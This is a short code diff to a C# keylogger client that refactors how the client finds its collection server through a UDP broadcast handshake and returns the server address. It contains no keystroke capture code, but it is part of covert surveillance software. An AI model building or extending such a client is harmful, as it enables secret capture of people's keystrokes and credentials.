@@ -22,6 +22,7 @@ namespace KeyloggerClient
             {
                 udpClient.EnableBroadcast = true;
                 udpClient.Client.ReceiveTimeout = timeout;
+                string resp = null;
 
                 IPEndPoint broadcastEndpoint = new IPEndPoint(IPAddress.Broadcast, broadcastPort);
                 byte[] discoveryMessage = Encoding.UTF8.GetBytes("DISCOVER_KEYLOGGER_SERVER");
@@ -38,17 +39,18 @@ namespace KeyloggerClient
 
                         if (responseMessage.StartsWith("KEYLOGGER_SERVER_RESPONSE:"))
                         {
-                            string serverIp = responseMessage.Substring("KEYLOGGER_SERVER_RESPONSE:".Length);
-                            return serverIp;
+                            resp = responseMessage.Substring("KEYLOGGER_SERVER_RESPONSE:".Length);
+                            return resp;
                         }
                     }
                 }
                 catch
                 {
                     // Ignore exceptions (timeouts or network errors)
+                    return resp;
                 }
 
-                return null;
+                return resp;
             }
         }
     }
